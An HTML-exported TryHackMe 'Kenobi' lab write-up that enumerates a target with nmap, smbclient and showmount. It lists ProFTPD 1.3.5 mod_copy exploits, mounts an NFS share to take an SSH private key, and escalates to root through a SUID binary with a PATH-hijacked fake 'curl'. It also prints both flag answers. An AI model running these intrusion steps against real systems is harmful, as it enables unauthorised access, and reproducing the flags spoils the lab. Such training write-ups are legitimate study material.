@@ -1,0 +1,801 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Kenobi : THM </title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="b8422f90-9746-4c47-b92c-148b4f98359b" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png"/></div><h1 class="page-title">Kenobi<strong> : THM</strong> </h1><p class="page-description"></p></header><div class="page-body"><p id="7227e221-eeed-4c68-b041-8041cd9e66cb" class="">Write Ups by : drew-byte</p><h2 id="8698040d-b235-477b-b015-ef3a303878ff" class="">Connection</h2><ul id="bb33eb08-bf36-45ed-9574-bccb1a9a7a2a" class="bulleted-list"><li style="list-style-type:disc">Download the ovpn provided by THM</li></ul><ul id="6a48a085-8c7d-469b-ab2e-7e22a51b1626" class="bulleted-list"><li style="list-style-type:disc">Run the ovpn</li></ul><pre id="22e1eaa8-b8b7-408a-ae1d-64b5198fdaf0" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $cd Desktop/
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $sudo openvpn drewbyte.ovpn</code></pre><hr id="cf92bc59-90ed-4414-b541-32b16cfd1503"/><h2 id="e8702dc9-699f-45cf-a1c2-6959ab03e689" class="">Scan the machine with nmap, how many ports are open?</h2><ul id="6dd247ce-bf78-4fb5-bd69-cfac309eca43" class="bulleted-list"><li style="list-style-type:disc">nmap result</li></ul><pre id="f0fdf093-e0b3-4f24-9449-4edff65f3879" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $nmap -AF 10.10.115.233
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-13 06:01 PST
+Nmap scan report for 10.10.115.233 (10.10.115.233)
+Host is up (0.38s latency).
+Not shown: 93 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
+|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
+|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-title: Site doesn&#x27;t have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      40074/udp   mountd
+|   100005  1,2,3      43756/udp6  mountd
+|   100005  1,2,3      47733/tcp6  mountd
+|   100005  1,2,3      52211/tcp   mountd
+|   100021  1,3,4      34011/tcp   nlockmgr
+|   100021  1,3,4      35933/tcp6  nlockmgr
+|   100021  1,3,4      36195/udp   nlockmgr
+|   100021  1,3,4      47540/udp6  nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2023-09-12T14:01:17
+|_  start_date: N/A
+|_clock-skew: mean: -6h19m59s, deviation: 2h53m12s, median: -8h00m00s
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2023-09-12T09:01:17-05:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.22 seconds</code></pre><p id="879c08bc-d65d-4870-af40-ab4480f878be" class="">ANSWER : 7</p><h2 id="77fe8bdc-03df-4b45-82d8-a43019ab5056" class="">Using the nmap command above, how many shares have been found?</h2><ul id="54d6dab1-a519-4e2d-9d6b-34a0ea3af65f" class="bulleted-list"><li style="list-style-type:disc">I use smbclient to see the shares</li></ul><pre id="a2fec3d0-2ea0-45d6-b940-995e0b475256" class="code code-wrap"><code>┌─[✗]─[drew@parrot]─[~/Desktop]
+└──╼ $smbclient -L 10.10.115.233
+Password for [WORKGROUP\drew]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	anonymous       Disk      
+	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available</code></pre><p id="629b179d-0d91-4373-acf8-1151da229bba" class="">ANSWER : 3</p><h2 id="d8c06fe5-ea7c-4585-960a-ca7736d40f12" class="">Once you&#x27;re connected, list the files on the share. What is the file can you see?</h2><pre id="c70d7f5f-22af-4945-b125-de02feaf909c" class="code code-wrap"><code>smb: \&gt; ls
+  .                                   D        0  Wed Sep  4 18:49:09 2019
+  ..                                  D        0  Wed Sep  4 18:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 18:49:09 2019
+
+		9204224 blocks of size 1024. 6877088 blocks available
+smb: \&gt; get log.txt
+getting file \log.txt of size 12237 as log.txt (7.9 KiloBytes/sec) (average 7.9 KiloBytes/sec)
+smb: \&gt; exit</code></pre><p id="44f52a54-201c-4bb1-b97a-088b8cfa9ddd" class="">ANSWER : log.txt</p><h2 id="da84b8a9-8cb3-45ff-9f00-5e5f980fec8a" class="">What port is FTP running on?</h2><p id="213b9f56-b334-4515-a9db-e4c6f0c8f426" class="">ANSWER : 21</p><h2 id="780c9518-04a3-43f3-be08-18027885a808" class="">What mount can we see?</h2><ul id="66385d7b-a0da-4ad3-b9d6-7d7472a6b8a7" class="bulleted-list"><li style="list-style-type:disc">I use an nfs command which is showmount</li></ul><pre id="1144adec-eccd-4688-86bb-0cff9451a221" class="code code-wrap"><code>┌─[✗]─[drew@parrot]─[/mnt/dev]
+└──╼ $showmount -e 10.10.115.233
+Export list for 10.10.115.233:
+/var *</code></pre><p id="80f22f2c-a52a-4492-a5b6-0ac48d4898a7" class="">ANSWER : /var</p><h2 id="18020d6c-e250-4a61-8617-d93b4258b2ce" class="">Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.</h2><p id="5c4932b4-aa71-4347-a336-bf39a293aaec" class="">What is the version?</p><ul id="8c661f8d-9ac7-47a5-998e-52d96152b4c7" class="bulleted-list"><li style="list-style-type:disc">nmap result in above</li></ul><p id="360d8ce1-ae1a-4132-a478-675c77ea7f83" class="">ANSWER : 1.3.5</p><h2 id="728287f7-3c12-4b63-b1dc-3a7e03955aec" class="">How many exploits are there for the ProFTPd running?</h2><pre id="33767d09-60af-4a2b-9210-d9b470cf9e92" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $searchsploit ProFTPD 1.3.5
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - &#x27;mod_copy&#x27; Command Execution  | linux/remote/37262.rb
+ProFTPd 1.3.5 - &#x27;mod_copy&#x27; Remote Command Exe | linux/remote/36803.py
+ProFTPd 1.3.5 - &#x27;mod_copy&#x27; Remote Command Exe | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre><p id="c567d99b-eaea-44a2-90d7-ee4b374ff3cd" class="">ANSWER : 4</p><h2 id="bb1d4f1d-46e0-425a-b0c5-a4e1ed96ba07" class="">What is Kenobi&#x27;s user flag (/home/kenobi/user.txt)?</h2><pre id="c114b004-b146-4370-ae5e-e1a4c9cd4d71" class="code code-wrap"><code>mkdir /mnt/dev
+mount 10.10.115.233:/var /mnt/dev
+ls -la /mnt/dev</code></pre><figure id="48b32594-6173-4265-9cac-24a287740c34" class="image"><a href="Kenobi%20THM%20b8422f9097464c47b92c148b4f98359b/Untitled.png"><img style="width:635px" src="Kenobi%20THM%20b8422f9097464c47b92c148b4f98359b/Untitled.png"/></a></figure><ul id="8033105b-e782-4740-8eba-debba8544f46" class="bulleted-list"><li style="list-style-type:disc">And now I have the id_rsa now In /tmp now I need to copy the file to my host using command</li></ul><pre id="e0717d80-c15f-4d4a-ae8d-08ffb8247354" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $cp /mnt/dev/tmp/id_rsa .
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $sudo chmod 600 id_rsa 
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $ssh -i id_rsa kenobi@10.10.115.233
+kenobi@kenobi:~$ ls 
+share  user.txt
+kenobi@kenobi:~$ cat user.txt 
+d0b0f3f53b6caa532a83915e19224899</code></pre><p id="51d5bead-323c-44e9-8953-27169e401494" class="">ANSWER : d0b0f3f53b6caa532a83915e19224899</p><h2 id="569fa302-09fc-4b4c-8db8-35b849fb9398" class="">What file looks particularly out of the ordinary?</h2><ul id="2df11b83-3790-4412-a4f9-1eb10b4f6f64" class="bulleted-list"><li style="list-style-type:disc">run this command</li></ul><pre id="d9289373-3160-4e5b-89bf-e4c88f63b70f" class="code code-wrap"><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><figure id="2c650532-37ec-44de-839b-4e147b5dbbaa" class="image"><a href="Kenobi%20THM%20b8422f9097464c47b92c148b4f98359b/Untitled%201.png"><img style="width:481px" src="Kenobi%20THM%20b8422f9097464c47b92c148b4f98359b/Untitled%201.png"/></a></figure><p id="c88be6d2-bead-439f-a933-198ab8b804b7" class="">ANSWER : /usr/bin/menu</p><h2 id="784e5c9e-ad72-4fa8-82ea-5d485ddbfbea" class="">Run the binary, how many options appear?</h2><ul id="253f774a-720a-4d9f-8061-b59419b5409b" class="bulleted-list"><li style="list-style-type:disc">use the strings command </li></ul><pre id="e91a9da7-acb1-4795-b5a3-6fbd9045c82a" class="code code-wrap"><code>strings menu
+</code></pre><ul id="3391700e-0954-4320-bd32-7bb514ee3c28" class="bulleted-list"><li style="list-style-type:disc">Output is this</li></ul><figure id="6f04f137-7809-4c16-ab6b-8712d054bd45" class="image"><a href="Kenobi%20THM%20b8422f9097464c47b92c148b4f98359b/Untitled%202.png"><img style="width:481px" src="Kenobi%20THM%20b8422f9097464c47b92c148b4f98359b/Untitled%202.png"/></a></figure><p id="464fd5b6-b0e9-45ea-9fbb-fd9593548d54" class="">ANSWER : 3</p><h2 id="9040d3e1-5e08-486d-864b-da01c4afc618" class="">What is the root flag (/root/root.txt)?</h2><ul id="1605c84c-8076-4190-8c29-e3d24a9654be" class="bulleted-list"><li style="list-style-type:disc">This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell.</li></ul><pre id="c6c522af-7605-42bc-8ec6-4652f0629e46" class="code code-wrap"><code>kenobi@kenobi:/usr/bin$ cd /tmp
+kenobi@kenobi:/tmp$ echo /bin/sh &gt; curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# cat /root/root.txt
+177b3cd8562289f37382721c28381f02</code></pre><p id="cfbec6b0-334f-4509-86fe-c81f8e660d05" class="">ANSWER : 177b3cd8562289f37382721c28381f02</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
